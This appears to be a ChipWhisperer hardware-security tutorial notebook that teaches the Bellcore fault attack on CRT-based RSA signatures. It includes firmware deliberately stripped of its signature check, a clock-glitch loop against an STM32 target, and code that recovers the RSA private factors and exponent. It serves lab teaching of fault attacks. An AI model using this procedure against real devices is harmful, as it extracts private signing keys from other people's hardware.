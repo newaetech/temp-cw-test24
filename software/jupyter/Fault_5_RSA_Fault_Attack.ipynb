{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true
   },
   "source": [
    "# RSA FaultAttack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "This advanced tutorial will demonstrate an attack on RSA signatures that use the Chinese Remainder Theorem as an optimization. This tutorial will make use of glitching, so it's recommended that you complete at least Fault_1-Introduction_to_Clock_Glitch_Attacks before attempting this tutorial. \n",
    "\n",
    "Additionally, this tutorial has been designed for Arm targets only. Users of other hardware may need to make changes to available RSA libraries to complete this tutorial.\n",
    "\n",
    "This attack is was originally detailed in a [1997 paper by Boneh, Demillo, and Lipton](https://www.researchgate.net/publication/2409434_On_the_Importance_of_Checking_Computations). This tutorial draws heavily from a blog post by David Wong, which you can find [here](https://www.cryptologie.net/article/371/fault-attacks-on-rsas-signatures/)."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "## Attack Theory"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "We won't cover much about what RSA (there's a [Wikipedia article](https://en.wikipedia.org/wiki/RSA_(cryptosystem)) for that), but we will give a quick summary.\n",
    "\n",
    "* RSA is a public key crypto system. It can be used in a few different ways, but we'll be using it for signing messages in this case. In this mode, User A can sign a message using their private information. User B can then verify that User A was the one who signed the message using publically available information.\n",
    "* This means that some information is public, while other information is private.\n",
    "* Public information includes the public modulus n, and the public exponent e\n",
    "* Private information includes the private exponent d, as well as p and q, which are prime factors of n\n",
    "* The public information can be freely shared, but learning any private information compromises the whole system\n",
    "\n",
    "The math of RSA (once you have all the key parts generated) is actually pretty simple. To sign the message, the following equation can be applied (with signature s, message m, private exponent d, and public modulus n):\n",
    "\n",
    "$$s = m^d({mod}\\ n)$$\n",
    "\n",
    "To verify a signature, the following equation is used (with signature s, public exponent e, message m, and public modulus n):\n",
    "\n",
    "$$s^e = m(mod\\ n)$$\n",
    "\n",
    "Despite the simplicity of these equations, signing messages in particular is a very slow operation, with the implementation from MBEDTLS, a popular crypto library for Arm devices, taking over 12M cycles for RSA-1024 (and this is with the optimization we make in the next section). This is because all of the numbers used in these equations are huge (n and d are 1024 bits long in this case). As you can imagine, any improvement we can make to the speed of this operation is very important. It turns out there is a large speed optimization that we can make."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "### Chinese Remainder Theorem (CRT)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Instead of computing $s = m^d(mod\\ n)$, we can instead break n into two primes, p and q, such that $n = pq$. As you might have guessed, p and q are the same private information we talked about earlier. Bascially, if we learn either, we'll be able to derive the rest of the private information fairly easily. We won't go into all the math, but here's the important operations:\n",
    "\n",
    "* Derive $d_p$ from d and p and $d_q$ from d and q\n",
    "* Calculate: $s_1 = m^{d_P}(mod\\ p)$ and $s_2 = m^{d_Q}(mod\\ q)$\n",
    "* Combine $s_1$ and $s_2$ into $s$ via CRT\n",
    "\n",
    "Since p and q are much smaller than n, creating signatures is much much faster this way. As such, many popular RSA implementations (including MBEDTLS) use CRT to speed up RSA."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "### Bellcore Attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Suppose that instead of everything going smoothly as above, that a fault happens during the calculation of $s_1$ or $s_2$ (we'll assume that the fault was with $s_2$ here, which will become $s^{'}_{2}$). If that happens, the following becomes true (with faulty signatures $s_2'$, which generates $s'$):\n",
    "\n",
    "$$s'^e = m(mod\\ p) \\Rightarrow s'^e - m = 0 (mod\\ p)$$\n",
    "$$s'^e \\neq m(mod\\ q) \\Rightarrow s'^e - m \\neq 0 (mod\\ q)$$\n",
    "\n",
    "The result of this is that p will be a factor of $s'^e - m$, but q and n will not be. Since p is also a factor of N, what follows is that:\n",
    "\n",
    "$$p = gcd(s'^e - m, N)$$\n",
    "\n",
    "Thus, if we introduce a fault in the calculation of either $s_1$ or $s_2$, we'll be able to get p, and from there all of the private values!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "## Firmware"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Next, let's take a look at the RSA implementation we're attacking. For this attack, we'll be using the `simpleserial-rsa-arm` project folder. There's a few files here, but the important one is `simpleserial-arm-rsa.c`. Open it. As you scroll through, you'll find all our public/private values. Next, navigate to `real_dec()`:\n",
    "\n",
    "```C\n",
    "uint8_t buf[128];\n",
    "uint8_t hash[32];\n",
    "uint8_t real_dec(uint8_t *pt)\n",
    "{\n",
    "     int ret = 0;\n",
    "\n",
    "     //first need to hash our message\n",
    "     memset(buf, 0, 128);\n",
    "     mbedtls_sha256(MESSAGE, 12, hash, 0);\n",
    "\n",
    "     trigger_high();\n",
    "     ret = simpleserial_mbedtls_rsa_rsassa_pkcs1_v15_sign(&rsa_ctx, NULL, NULL, MBEDTLS_RSA_PRIVATE, MBEDTLS_MD_SHA256, 32, hash, buf);\n",
    "     trigger_low();\n",
    "\n",
    "     //send back first 48 bytes\n",
    "     simpleserial_put('r', 48, buf);\n",
    "     return ret;\n",
    "}\n",
    "```\n",
    "\n",
    "You'll notice that we first hash our message (`\"Hello World!\"`) using SHA256. This isn't too important now, but it will be important later. Next we sign our message using `simpleserial_mbedtls_rsa_rsassa_pkcs1_v15_sign()`, then send back the first 48 bytes of it. We'll be sending the signature back in multiple chunks to avoid overflowing the CWLite's buffer of 128 bytes via `sig_chunk_1()` and `sig_chunk_2()` directly below this function.\n",
    "\n",
    "We'll actually skip over `simpleserial_mbedtls_rsa_rsassa_pkcs1_v15_sign()` here, since most of the important stuff actually happens in a different function. You should note, however, that this function has been modified to remove a signature check, which would need to be bypassed in a real attack.\n",
    "\n",
    "Next, find the function `simpleserial_mbedtls_rsa_private()`, a cleaned up version of `mbedtls_rsa_private()`, where the signature calculation actually happens:\n",
    "```C\n",
    "/*\n",
    " * Do an RSA private key operation\n",
    " */\n",
    "static int simpleserial_mbedtls_rsa_private( mbedtls_rsa_context *ctx,\n",
    "                 int (*f_rng)(void *, unsigned char *, size_t),\n",
    "                 void *p_rng,\n",
    "                 const unsigned char *input,\n",
    "                 unsigned char *output )\n",
    "\n",
    "```\n",
    "\n",
    "scrolling down a bit, we do indeed find that this function does indeed use CRT to speed up the calculation:\n",
    "\n",
    "```C\n",
    "    /*\n",
    "     * Faster decryption using the CRT\n",
    "     *\n",
    "     * T1 = input ^ dP mod P\n",
    "     * T2 = input ^ dQ mod Q\n",
    "     */\n",
    "    MBEDTLS_MPI_CHK( mbedtls_mpi_exp_mod( &T1, &T, DP, &ctx->P, &ctx->RP ) );\n",
    "    MBEDTLS_MPI_CHK( mbedtls_mpi_exp_mod( &T2, &T, DQ, &ctx->Q, &ctx->RQ ) );\n",
    "```\n",
    "\n",
    "We'll revisit this firmware in the future, but for now, let's build our firmware and then move over to our python script:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "PLATFORM = \"CWLITEARM\"\n",
    "CRYPTO_TARGET=\"MBEDTLS\"\n",
    "CRYPTO_OPTIONS=\"RSA\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "%%bash -s \"$PLATFORM\" \"$CRYPTO_TARGET\" \"$CRYPTO_OPTIONS\"\n",
    "cd ../../hardware/victims/firmware/simpleserial-rsa\n",
    "make PLATFORM=$1 CRYPTO_TARGET=$2 CRYPTO_OPTIONS=$3 OPT=2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "## Attack Script"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Start by initializing the ChipWhisperer:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "import chipwhisperer as cw\n",
    "import binascii\n",
    "scope = cw.scope()\n",
    "target = cw.target(scope)\n",
    "scope.adc.basic_mode = \"rising_edge\"\n",
    "scope.clock.clkgen_freq = 7370000\n",
    "scope.clock.adc_src = \"clkgen_x1\"\n",
    "scope.trigger.triggers = \"tio4\"\n",
    "scope.io.tio1 = \"serial_rx\"\n",
    "scope.io.tio2 = \"serial_tx\"\n",
    "scope.io.hs2 = \"clkgen\""
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Next, program it with our new firmware:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true,
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "prog = cw.programmers.STM32FProgrammer\n",
    "fw_path = \"../../hardware/victims/firmware/simpleserial-rsa/simpleserial-rsa-CWLITEARM.hex\"\n",
    "cw.programTarget(scope, prog, fw_path)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "### Verifying Signatures"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Let's start by seeing if we can verify the signature that we get back. First, we run the signature calculation (there's a `time.sleep()` here to make sure the calculation finishes. You may need to increase this):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "import time\n",
    "target.go_cmd = 't\\\\n'\n",
    "scope.arm()\n",
    "target.go()\n",
    "\n",
    "while target.isDone() is False:\n",
    "    timeout -= 1\n",
    "    time.sleep(0.01)\n",
    "\n",
    "try:\n",
    "    ret = scope.capture()\n",
    "    if ret:\n",
    "        print('Timeout happened during acquisition')\n",
    "except IOError as e:\n",
    "    print('IOError: %s' % str(e))\n",
    "    \n",
    "time.sleep(2)\n",
    "num_char = target.ser.inWaiting()\n",
    "output = target.ser.read(num_char, timeout=10)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "print(scope.adc.trig_count)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "As you can see, the signature takes a long time! For the STM32F3, it should be around 12.7M cycles. Next, let's get the rest of the signature back and see what it looks like."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "target.go_cmd = '1\\\\n'\n",
    "target.go()\n",
    "time.sleep(0.2)\n",
    "num_char = target.ser.inWaiting()\n",
    "output += target.ser.read(num_char, timeout=10)\n",
    "\n",
    "target.go_cmd = '2\\\\n'\n",
    "target.go()\n",
    "time.sleep(0.2)\n",
    "num_char = target.ser.inWaiting()\n",
    "output += target.ser.read(num_char, timeout=10)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "print(output)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "You should see something like:\n",
    "```\n",
    "r4F09799F6A59081B725599753330B7A2440ABC42606601622FE0C582646E32555303E1062A2989D9B4C265431ADB58DD\n",
    "z00\n",
    "r85BB33C4BB237A311BC40C1279528FD6BB36F94F534A4D8284A18AB8E5670E734C55A6CCAB5FB5EAE02BA37E2D56648D\n",
    "z00\n",
    "r7A13BBF17A0E07D607C07CBB72C7A7A77076376E8434CE6E136832DC95DB3D80\n",
    "z00\n",
    "```\n",
    "\n",
    "We'll need to strip all the extra simpleserial stuff out. This can be done like so:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "newout = output.replace(\"r\", \"\").replace(\"\\nz00\",\"\").replace(\"\\n\",\"\")\n",
    "print(newout)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Then we can convert this to binary using binascii:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "import binascii\n",
    "sig = binascii.unhexlify(newout)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Finally, we can verify that the signature is correct using the PyCryptodome package:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "from Crypto.PublicKey import RSA\n",
    "from Crypto.Signature import PKCS1_v1_5 \n",
    "\n",
    "from Crypto.Hash import SHA256\n",
    "\n",
    "E = 0x10001\n",
    "N = 0x9292758453063D803DD603D5E777D7888ED1D5BF35786190FA2F23EBC0848AEADDA92CA6C3D80B32C4D109BE0F36D6AE7130B9CED7ACDF54CFC7555AC14EEBAB93A89813FBF3C4F8066D2D800F7C38A81AE31942917403FF4946B0A83D3D3E05EE57C6F5F5606FB5D4BC6CD34EE0801A5E94BB77B07507233A0BC7BAC8F90F79\n",
    "m = b\"Hello World!\"\n",
    "\n",
    "hash_object = SHA256.new(data=m)\n",
    "pub_key = RSA.construct((N, E))\n",
    "signer = PKCS1_v1_5.new(pub_key) \n",
    "print(signer.verify(hash_object, sig))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "If everything worked out correctly, you should see `True` printed above. Now onto the actual attack."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "### Getting a Glitch"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "As usual, we'll start off by setting up the glitch module:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "scope.glitch.clk_src = \"clkgen\"\n",
    "scope.glitch.output = \"clock_xor\"\n",
    "scope.glitch.trigger_src = \"ext_single\"\n",
    "scope.glitch.repeat = 1\n",
    "scope.glitch.width = -9\n",
    "scope.glitch.offset = -38.3\n",
    "scope.io.hs2 = \"glitch\"\n",
    "print(scope.glitch)\n",
    "from collections import namedtuple\n",
    "Range = namedtuple('Range', ['min', 'max', 'step'])"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "\n",
    "\n",
    "Next, the glitch attempts may crash the target, so we'll define a function to reset our target:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "import time\n",
    "from tqdm import tnrange\n",
    "def reset_target(scope):\n",
    "    scope.io.nrst = 'low'\n",
    "    #scope.io.pdic = 'low'\n",
    "    time.sleep(0.05)\n",
    "    scope.io.nrst = 'high'\n",
    "    #scope.io.pdic = 'high'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Now for our actual attack loop. There's a lot going on here, so we'll move through a little slower than usual. Overall, what we want to do is:\n",
    "* Insert a glitch\n",
    "* Read the signature back\n",
    "* Verify that it's correct\n",
    "\n",
    "The first step is the same as earlier. For the last two, we'll cheat a little by checking the for the beginning of the correct signature before proceeding, but we could also read back the whole thing:\n",
    "\n",
    "```python\n",
    "# Read back signature\n",
    "num_char = target.ser.inWaiting()\n",
    "output = target.ser.read(num_char, timeout=10)\n",
    "    if \"4F09799\" not in output:\n",
    "        #Something abnormal has happened\n",
    "```\n",
    "\n",
    "Now that we've found some abnormal behaviour, we need to verify that the target hasn't crashed. This can be done pretty easily by checking if we got anything at all:\n",
    "\n",
    "```python\n",
    "if \"4F09799\" not in output:\n",
    "    #Something abnormal has happened\n",
    "    if len(output) > 0:\n",
    "        # Possible glitch!\n",
    "    else:\n",
    "        # Crash, reset and try again\n",
    "        print(f\"Probably crash at {scope.glitch.ext_offset}\")\n",
    "        reset_target(scope)\n",
    "        time.sleep(0.5)\n",
    "```\n",
    "\n",
    "As a last step, we'll build our full signature and do one final check to make sure everything looks okay:\n",
    "\n",
    "```python\n",
    "if len(output) > 0:\n",
    "    # Possible glitch!\n",
    "    print(f\"Possible glitch at offset {scope.glitch.ext_offset}\\nOutput: {output}\")\n",
    "    \n",
    "    # get rest of signature back\n",
    "    target.go_cmd = '1\\\\n'\n",
    "    target.go()\n",
    "    time.sleep(0.2)\n",
    "    num_char = target.ser.inWaiting()\n",
    "    output += target.ser.read(num_char, timeout=10)\n",
    "\n",
    "    target.go_cmd = '2\\\\n'\n",
    "    target.go()\n",
    "    time.sleep(0.2)\n",
    "    num_char = target.ser.inWaiting()\n",
    "    output += target.ser.read(num_char, timeout=10)\n",
    "    \n",
    "    # strip out extra simpleserial stuff\n",
    "    newout = output.replace(\"r\", \"\").replace(\"\\nz00\",\"\").replace(\"\\n\",\"\")\n",
    "    \n",
    "    print(f\"Full output: {newout}\")\n",
    "    if (len(newout) == 256) and \"r0001F\" not in output:\n",
    "        print(\"Very likely glitch!\")\n",
    "        break\n",
    "```\n",
    "\n",
    "We'll add in scanning over different over different offsets as well. We'll start at an offset of 7M cycles. We actually have a lot of area that we could place the glitch in, so the starting point is fairly arbitrary. For the STM32F3, this places the glitch near the beginning of the calculation for $s_2$. If you'd like, you can move `trigger_low()` into `simpleserial_mbedtls_rsa_private()` to see how long different parts of the algorithm take.\n",
    "\n",
    "All together, our attack loops looks like this:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "from tqdm import tnrange\n",
    "import binascii\n",
    "for i in tnrange(7000000, 7100000):\n",
    "    scope.glitch.ext_offset = i\n",
    "    target.go_cmd = 't\\\\n'\n",
    "    scope.adc.timeout = 3\n",
    "    scope.arm()\n",
    "    target.go()\n",
    "\n",
    "    while target.isDone() is False:\n",
    "        timeout -= 1\n",
    "        time.sleep(0.01)\n",
    "\n",
    "    try:\n",
    "        ret = scope.capture()\n",
    "        if ret:\n",
    "            print('Timeout happened during acquisition')\n",
    "    except IOError as e:\n",
    "        print('IOError: %s' % str(e))\n",
    "    time.sleep(2)\n",
    "    \n",
    "    # Read back signature\n",
    "    num_char = target.ser.inWaiting()\n",
    "    output = target.ser.read(num_char, timeout=10)\n",
    "    if \"4F09799\" not in output:\n",
    "        # Something abnormal happened\n",
    "        if len(output) > 0:\n",
    "            # Possible glitch!\n",
    "            print(f\"Possible glitch at offset {scope.glitch.ext_offset}\\nOutput: {output}\")\n",
    "            \n",
    "            # Get rest of signature back\n",
    "            target.go_cmd = '1\\\\n'\n",
    "            target.go()\n",
    "            time.sleep(0.2)\n",
    "            num_char = target.ser.inWaiting()\n",
    "            output += target.ser.read(num_char, timeout=10)\n",
    "\n",
    "            target.go_cmd = '2\\\\n'\n",
    "            target.go()\n",
    "            time.sleep(0.2)\n",
    "            num_char = target.ser.inWaiting()\n",
    "            output += target.ser.read(num_char, timeout=10)\n",
    "            \n",
    "            # Strip out extra simpleserial stuff\n",
    "            newout = output.replace(\"r\", \"\").replace(\"\\nz00\",\"\").replace(\"\\n\",\"\")\n",
    "            print(f\"Full output: {newout}\")\n",
    "            if (len(newout) == 256) and \"r0001F\" not in output:\n",
    "                print(\"Very likely glitch!\")\n",
    "                break\n",
    "        else:\n",
    "            # Crash, reset and try again\n",
    "            print(f\"Probably crash at {scope.glitch.ext_offset}\")\n",
    "            reset_target(scope)\n",
    "            time.sleep(0.5)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Now, let's convert our glitched signature to binary and move on to the final part of the tutorial"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "sig = binascii.unhexlify(newout)\n",
    "print(sig)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "### Completing The Attack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "We've got our glitched signature, but we've still got a little work to do. As was mentioned earlier, the message that's signed isn't the original message, it's a hash of it (SHA256 in our case). This also isn't quite true. Instead, the message is padded according to the PKCS#1 v1.5 standard. Luckily, this standard's fairly simple. PKCS#1 v1.5 padding looks like:\n",
    "\n",
    "|00|01|ff...|00|hash_prefix|message_hash|\n",
    "\n",
    "Here, the ff... part is a string of ff bytes long enough to make the size of the padded message the same as n, while hash_prefix is an identifier number for the hash algorithm used on message_hash. In our case, SHA256 has the hash prefix `3031300d060960864801650304020105000420`.\n",
    "\n",
    "Altogether, the function to build this message looks like:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "def build_message(m, N):\n",
    "    sha_id = \"3031300d060960864801650304020105000420\"\n",
    "    N_len = (len(bin(N)) - 2 + 7) // 8\n",
    "    pad_len = (len(hex(N)) - 2) // 2 - 3 - len(m)//2 - len(sha_id)//2\n",
    "    padded_m = \"0001\" + \"ff\" * pad_len + \"00\" + sha_id + m\n",
    "    return padded_m\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Now that we've got our function, we can build our message:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "from Crypto.Hash import SHA256\n",
    "import binascii\n",
    "\n",
    "hash_object = SHA256.new(data=b\"Hello World!\")\n",
    "hashed_m = binascii.hexlify(hash_object.digest()).decode()\n",
    "padded_m = build_message(hashed_m, N)\n",
    "print(hashed_m)\n",
    "print(padded_m)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Now all that's left is to use our gcd formula from earlier:\n",
    "\n",
    "$$p = gcd(s'^e - m, N)$$\n",
    "\n",
    "And we should get either p or q! Note that this next block may take a while to run."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "from math import gcd\n",
    "N = 0x9292758453063D803DD603D5E777D7888ED1D5BF35786190FA2F23EBC0848AEADDA92CA6C3D80B32C4D109BE0F36D6AE7130B9CED7ACDF54CFC7555AC14EEBAB93A89813FBF3C4F8066D2D800F7C38A81AE31942917403FF4946B0A83D3D3E05EE57C6F5F5606FB5D4BC6CD34EE0801A5E94BB77B07507233A0BC7BAC8F90F79\n",
    "e = 0x10001\n",
    "\n",
    "sig_int = int.from_bytes(sig, \"big\")\n",
    "padded_m_int = int.from_bytes(binascii.unhexlify(padded_m), \"big\")\n",
    "a = int.from_bytes(sig, \"big\")**e - int.from_bytes(binascii.unhexlify(padded_m), \"big\")\n",
    "p_test = gcd(a, N)\n",
    "print(hex(p_test))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Open up `simpleserial-arm-rsa.c` and see if the value printed out is either p or q!"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "### Getting the Rest of the Private Values"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "As mentioned earler, now that we have either p or q, we can derive the rest of the private values. The easiest is the other prime factor, which is just:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true
   },
   "outputs": [],
   "source": [
    "q_test = N//p_test\n",
    "print(hex(q_test))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "Finally, there's d, which can be derived by:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "hidden": true,
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "phi = (q_test - 1)*(p_test - 1)\n",
    "def egcd(a, b):\n",
    "    x,y, u,v = 0,1, 1,0\n",
    "    while a != 0:\n",
    "        q, r = b//a, b%a\n",
    "        m, n = x-u*q, y-v*q\n",
    "        b,a, x,y, u,v = a,r, u,v, m,n\n",
    "        gcd = b\n",
    "    return gcd, x, y\n",
    "\n",
    "gcd, a, b = egcd(e, phi)\n",
    "\n",
    "print(hex(a))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "heading_collapsed": true,
    "hidden": true
   },
   "source": [
    "## Going Further"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "hidden": true
   },
   "source": [
    "There's still more you can do with this attack:\n",
    "\n",
    "* You can try glitching the other part of the signature calculation to verify that you get the other prime factor of n out\n",
    "* We used clock glitching in this tutorial. You may want to try it with voltage glitching as well\n",
    "\n",
    "As mentioned earlier in the tutorial, a verification of the calculated signature was removed:\n",
    "```C\n",
    "    /* Compare in constant time just in case */\n",
    "    /* for( diff = 0, i = 0; i < ctx->len; i++ ) */\n",
    "    /*     diff |= verif[i] ^ sig[i]; */\n",
    "    /* diff_no_optimize = diff; */\n",
    "\n",
    "    /* if( diff_no_optimize != 0 ) */\n",
    "    /* { */\n",
    "    /*     ret = MBEDTLS_ERR_RSA_PRIVATE_FAILED; */\n",
    "    /*     goto cleanup; */\n",
    "    /* } */\n",
    "\n",
    "```\n",
    "\n",
    "This part is near the end of `simpleserial_mbedtls_rsa_rsassa_pkcs1_v15_sign()`. If you want a larger challenge, you can try uncommenting that and trying to glitch past it as well."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.1"
  },
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": true,
   "title_cell": "Table of Contents",
   "title_sidebar": "Contents",
   "toc_cell": false,
   "toc_position": {
    "height": "calc(100% - 180px)",
    "left": "10px",
    "top": "150px",
    "width": "384px"
   },
   "toc_section_display": true,
   "toc_window_display": true
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
